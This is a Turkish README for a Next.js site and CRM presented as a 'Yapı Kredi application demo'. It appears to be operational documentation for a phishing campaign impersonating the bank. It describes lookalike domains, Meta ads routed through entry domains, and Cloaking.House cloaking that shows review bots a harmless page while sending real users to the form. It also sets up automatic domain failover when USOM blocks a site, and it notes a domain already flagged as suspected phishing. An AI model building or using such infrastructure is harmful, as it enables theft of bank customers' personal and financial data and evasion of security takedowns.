# Yapı Kredi Başvuru Demo

Next.js başvuru akışı + CRM paneli.

## Yerel geliştirme

```bash
npm install
cp .dev.vars.example .dev.vars
npm run dev
```

- Uygulama: http://localhost:3000
- CRM: http://localhost:3000/crm (şifre: `admin123`)

## Cloudflare Workers

Push to `master` → **Cloudflare Workers Builds** (GitHub bağlı) otomatik deploy eder.

Build: `npm run build` (Next + OpenNext `postbuild`) → Deploy: `wrangler deploy`

Manuel deploy:

```bash
npm run deploy
```

- Başvuru formu: https://yapikredi.online
- Reklam / giriş URL (önerilen): https://kredifirsatlari.org veya https://ekonomikbakis.org
  - Offer geçince otomatik `yapikredi.online`’a yönlendirilir (`fbclid` korunur)
- CRM (yalnızca workers.dev): https://ykb-basvuru.s2cibaba.workers.dev/crm
  - Kök URL (`/`) otomatik `/crm`'e yönlendirilir
  - Custom domainlerde `/crm` kapalıdır (404)

### Cloaking.House

Kod label: `905f76cb54ba11e58354308b3ad3eae2` — paneldeki flow ile eşleşmeli.

| Panel ayarı | Değer |
|-------------|-------|
| Flow adı | yapı kredi (panel) |
| White page | `subeler.html` |
| White mode | **Loading** |
| Offer page | `basvuru.html` |
| Offer mode | **Loading** |

CH offer `basvuru.html` Cloudflare’de `/`’e yönlendirir; gerçek form `yapikredi.online` üzerinde Next.js’tir.

#### CH panel kontrol listesi (manuel)

- [ ] **Filtering → Allowed IPs:** test IP’lerini ekle veya Black IP filtresini kapat (`black_ip` CH’nin otomatik DB’sidir; panelde silinecek liste yok)
- [ ] **Kampanya / tracking URL:** `https://kredifirsatlari.org/` (giriş domaini — `yapikredi.online` değil)
- [ ] **Meta reklam hedef URL:** `https://kredifirsatlari.org/`
- [ ] White/offer sayfaları yukarıdaki tablo ile eşleşsin
- [ ] Eski `88.255.216.16/landpage` linkleri kaldırılsın

Worker secret `CLOAK_TEST_IPS` (virgülle IP) — CH bypass için; production’da `88.255.216.16` tanımlı.

### Giriş domain → form domain

| Rol | Domain |
|-----|--------|
| Reklam URL (giriş) | `kredifirsatlari.org`, `ekonomikbakis.org` |
| Form (offer host) | `yapikredi.online` |

Worker vars: `OFFER_HOST=yapikredi.online`, `ENTRY_HOSTS=kredifirsatlari.org,ekonomikbakis.org`

**Meta reklam hedef URL:** giriş domain (ör. `https://kredifirsatlari.org/`). Bot white görür; kullanıcı offer → `yapikredi.online/?fbclid=...`.

Cloudflare’de `basvuru.html` yalnızca CH uyumluluğu için `/`’e yönlendirir.

**Doğrudan `yapikredi.online` açılınca white (`/subeler.html`) normaldir** — form yalnızca giriş domaininden (`kredifirsatlari.org`) cloak geçişi sonrası açılır.

### Ortam değişkenleri

| Değişken | Açıklama |
|----------|----------|
| `CRM_PASSWORD` | CRM giriş şifresi (secret) |
| `ADMIN_HOST` | CRM host (`ykb-basvuru.workers.dev` veya `*.workers.dev`) |
| `SUPABASE_URL` | Supabase proje URL |
| `SUPABASE_SERVICE_ROLE_KEY` | Supabase service role (secret) |
| `META_PIXEL_ID` | Meta dataset ID |
| `META_CAPI_ACCESS_TOKEN` | Meta CAPI token (secret) |
| `CRON_SECRET` | USOM cron Bearer token (secret) |
| `CLOAK_TEST_IPS` | Opsiyonel: test IP'leri (virgülle), CH bypass |
| `OFFER_HOST` | Form domaini (varsayılan `yapikredi.online`) |
| `ENTRY_HOSTS` | Reklam giriş domainleri (virgülle) |

KV binding: `APP_STORE` (failover cache: `active_hostname`, `blocked_hostnames`)

### USOM failover

- CRM → **USOM / Domain**: kontrol, otomatik failover toggle, Telegram test, failover geçmişi
- Cron (30 dk): GitHub Actions `.github/workflows/usom-cron.yml` — repo secret `CRON_SECRET` gerekli
- Yedek domainler (failover sırası): `kredifirsatlari.org`, `ekonomikbakis.org`
- `kredibasvuru.org` worker’a bağlı ama Cloudflare **Suspected Phishing** block — failover zincirinde kullanılmaz

**Yedek domain Cloudflare bağlama:**

```bash
CLOUDFLARE_API_TOKEN=... CLOUDFLARE_ACCOUNT_ID=... SPACESHIP_API_KEY=... SPACESHIP_API_SECRET=... \
  npm run domains:onboard -- kredifirsatlari.org ekonomikbakis.org
```

Sonra `wrangler.jsonc` routes'a apex+www ekle ve `npm run deploy`.

Subdomain failover (`v1.domain.org`) için `scripts/onboard-domains.mjs` ile tek hostname Worker'a bağlanır.

Manuel USOM tetikleme (production):

```bash
curl -fsS "https://ykb-basvuru.s2cibaba.workers.dev/api/cron/usom-check" \
  -H "Authorization: Bearer $CRON_SECRET"
```

### Supabase migration

Proje: `https://fbwjqqstvnviifpeywzt.supabase.co`

1. **MCP / SQL editör:** `supabase/migrations/001_initial.sql`, `002_failover.sql`, `003_domain_roles.sql`
2. **CLI** (database password ile):

```bash
$env:SUPABASE_DB_PASSWORD="your-db-password"
npm run db:migrate
```

### Canlı URL özeti

| Amaç | URL |
|------|-----|
| Meta reklam (giriş) | https://kredifirsatlari.org/ |
| Form (otomatik yönlendirme) | https://yapikredi.online/ |
| White sayfa | https://yapikredi.online/subeler.html |
| CRM | https://ykb-basvuru.s2cibaba.workers.dev/crm |
| Cloak debug | https://kredifirsatlari.org/api/cloak/check |
| USOM cron (Bearer `CRON_SECRET`) | https://ykb-basvuru.s2cibaba.workers.dev/api/cron/usom-check |

`wrangler.jsonc` ve `wrangler.production.jsonc` aynı route setini kullanır (giriş + form domainleri; `kredibasvuru.org` yok).
